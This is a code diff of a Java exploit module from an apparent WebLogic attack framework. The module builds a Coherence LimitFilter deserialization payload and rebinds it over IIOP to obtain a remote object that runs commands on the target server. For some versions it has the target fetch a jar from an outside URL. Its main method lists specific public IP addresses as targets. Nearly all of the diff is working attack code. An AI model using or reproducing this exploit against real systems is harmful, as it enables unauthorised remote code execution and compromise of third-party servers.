@@ -12,17 +12,20 @@ import com.r4v3zn.weblogic.tools.payloads.VulTest;
 import weblogic.cluster.singleton.ClusterMasterRemote;
 
 import javax.naming.Context;
-import javax.naming.InitialContext;
 import javax.naming.NamingException;
+import java.io.Serializable;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.ArrayList;
-import java.util.Hashtable;
 import java.util.List;
 
 import static com.r4v3zn.weblogic.tools.utils.CallUtils.callInfo;
+import static com.r4v3zn.weblogic.tools.utils.ClassLoaderUtils.loadJar;
+import static com.r4v3zn.weblogic.tools.utils.ContextUtils.getContext;
+import static com.r4v3zn.weblogic.tools.utils.ContextUtils.rebind;
 import static com.r4v3zn.weblogic.tools.utils.SocketUtils.hexStrToBinaryStr;
 import static com.r4v3zn.weblogic.tools.utils.StringUtils.getRandomString;
+import static com.r4v3zn.weblogic.tools.utils.VersionUtils.checkVersion;
 import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
 import static org.apache.commons.lang3.StringUtils.isBlank;
 
@@ -44,7 +47,7 @@ public class S1274489 implements VulTest {
     /**
      * 漏洞利用 jar 文件名称
      */
-    public static final String POC_NAME = "coherence.jar";
+    public static final String[] DEPENDENCIES = new String[]{"coherence.jar"};
 
     /**
      * RMI SERVER NAME
@@ -59,44 +62,82 @@ public class S1274489 implements VulTest {
     /**
      * 漏洞影响版本
      */
-    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
-        add("12.1.3.0");
-        add("12.1.3.0.0");
-        add("12.2.1.3.0");
-        add("12.2.1.3.0.0");
-        add("12.2.1.4.0");
-        add("12.2.1.4.0.0");
-    }};
+    public static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};
 
+    /**
+     * remote
+     */
     private ClusterMasterRemote remote = null;
 
+    /**
+     * bindName
+     */
     private String bindName = "";
 
+    private static final String CHARSET_NAME = "UTF-8";
 
     /**
      * 漏洞验证,漏洞存在返回 true 否则返回 false
-     * @param ip ip
-     * @param port 端口
+     * @param url url
      * @param param 执行参数
-     * @return 漏洞存在返回 true 否则返回 false
-     * @throws Exception 抛出异常
+     * @return
+     * @throws Exception
      */
     @Override
-    public Boolean vulnerable(String ip, Integer port, String... param) throws Exception {
-        this.bindName = getRandomString(16);
-        ContextPojo contextPojo = rebindAny(ip,port,bindName,param);
+    public Boolean vulnerable(String url, String... param) throws Exception {
+        if(isBlank(url)){
+            throw new MyException("URL 不能为空");
+        }
+        if(!url.startsWith("http")){
+            url = "http://"+url;
+        }
+        URL checkURL = new URL(url);
+        String ip = checkURL.getHost();
+        Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
+        String protocol = checkURL.getProtocol();
+        String version = getVersion(ip, port);
+        Boolean flag = checkVersion(version, VUL_VERSIONS);
+        if(!flag){
+            return false;
+        }
+        if(!version.contains("12.1.3.0") && param.length == 0){
+            throw new MyException("please set your javascript file url!");
+        }
+        URLClassLoader urlClassLoader = null;
+        try{
+            urlClassLoader = loadJar(version, DEPENDENCIES);
+        }catch (Exception e){
+            e.printStackTrace();
+            return false;
+        }
+        String javascriptUrl = "";
+        if(param.length == 0){
+            javascriptUrl = "";
+        }else{
+            javascriptUrl = param[0];
+        }
+        ObjectPayload<Serializable> objectPayload = new LimitFilterGadget();
+        byte[] bytes = hexStrToBinaryStr(RMI_SERVER_HEX);
+        // random token (bindName)
+        bindName = getRandomString(16);
+        Object object = objectPayload.getObject(bytes,new String[]{bindName, javascriptUrl}, RMI_SERVER_NAME, urlClassLoader);
+        String jndiUrl = String.format("iiop://%s:%s", ip, port);
+        ContextPojo contextPojo = null;
+        try{
+            contextPojo = rebind(jndiUrl, object, urlClassLoader);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
         if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
             return false;
         }
         Context context = contextPojo.getContext();
-        URLClassLoader urlClassLoader = contextPojo.getUrlClassLoader();
-        String currentOs = System.getProperty("os.name");
         System.out.println("[*] bind name --> "+bindName+" ok !");
         try{
             ClusterMasterRemote poc = (ClusterMasterRemote)context.lookup(bindName);
             this.remote = poc;
             String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
-            cmd += "@@"+currentOs+"####"+ip+":"+port;
+            cmd += "@@"+CHARSET_NAME+"####"+ip+":"+port;
             String rsp = poc.getServerLocation(cmd);
             return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
         }catch (Exception e){
@@ -104,57 +145,10 @@ public class S1274489 implements VulTest {
             return false;
         }finally {
             System.gc();
-            urlClassLoader.close();
+            if(urlClassLoader != null){
+                urlClassLoader.close();
+            }
         }
-    }
-
-    /**
-     * rebindAny
-     * @param ip ip
-     * @param port port
-     * @param param 参数
-     * @return
-     * @throws NamingException
-     */
-    private ContextPojo rebindAny(String ip, Integer port, String bindName, String... param) throws Exception {
-        // weblogic version
-        String version = getVersion(ip, port);
-        System.out.println("[*] weblogic version --> "+version);
-        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
-            return null;
-        }
-        String javascriptJarUrl = "";
-        if(!version.contains("12.1.3.0") && param.length == 0){
-            throw new MyException("please set your javascript file url!");
-        }
-        if(param.length == 0){
-            javascriptJarUrl = "";
-        }else{
-            javascriptJarUrl = param[0];
-        }
-        URLClassLoader urlClassLoader = null;
-        try{
-            urlClassLoader = loadJar(version);
-        }catch (Exception e){
-            e.printStackTrace();
-            return null;
-        }
-        Hashtable<String, String> env = new Hashtable<>();
-        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
-        env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
-        Context context = new InitialContext(env);
-        ObjectPayload objectPayload = new LimitFilterGadget();
-        byte[] bytes = hexStrToBinaryStr(RMI_SERVER_HEX);
-        Object object = objectPayload.getObject(bytes,new String[]{bindName, javascriptJarUrl}, RMI_SERVER_NAME, urlClassLoader);
-        try{
-            context.rebind("hello", object);
-        }catch (Exception e){
-            e.printStackTrace();
-        }
-        ContextPojo contextPojo = new ContextPojo();
-        contextPojo.setContext(context);
-        contextPojo.setUrlClassLoader(urlClassLoader);
-        return contextPojo;
     }
 
     /**
@@ -172,26 +166,6 @@ public class S1274489 implements VulTest {
         return callInfo(cmd, remote);
     }
 
-    /**
-     * 加载依赖 jar
-     * @param version weblogic 版本
-     * @return
-     */
-    private URLClassLoader loadJar(String version) throws Exception {
-        String path = this.getClass().getResource("/lib/").getPath();
-        for (String vulVersion:VUL_VERSIONS) {
-            if(!vulVersion.contains(version)){
-                continue;
-            }
-            version = version.replace(".0.0", ".0");
-            String loadPath = path + version+"/"+ POC_NAME;
-            System.out.println("[*] load class coherence.jar version --> "+version);
-            System.out.println("[*] coherence path --> "+loadPath);
-            URL[] urls = new URL[]{new URL("file:"+loadPath)};
-            return new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
-        }
-        return null;
-    }
 
     public static void main(String[] args) throws Exception {
         String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
@@ -207,12 +181,14 @@ public class S1274489 implements VulTest {
 //        hostList.add("150.136.146.91:7001");
 //        hostList.add("129.146.88.47:7001");
         hostList.add("101.227.181.106:80");
+        S1274489 vul = new S1274489();
+        System.out.println(vul.vulnerable("http://192.168.1.9:7001"));
         // http:///
-        for (String host:hostList) {
-            String ip = host.split(":")[0];
-            Integer port = Integer.parseInt(host.split(":")[1]);
-            S1274489 vul = new S1274489();
-            vul.exploit(ip, port,url);
-        }
+//        for (String host:hostList) {
+//            String ip = host.split(":")[0];
+//            Integer port = Integer.parseInt(host.split(":")[1]);
+//            S1274489 vul = new S1274489();
+//            vul.exploit(ip, port,url);
+//        }
     }
 }
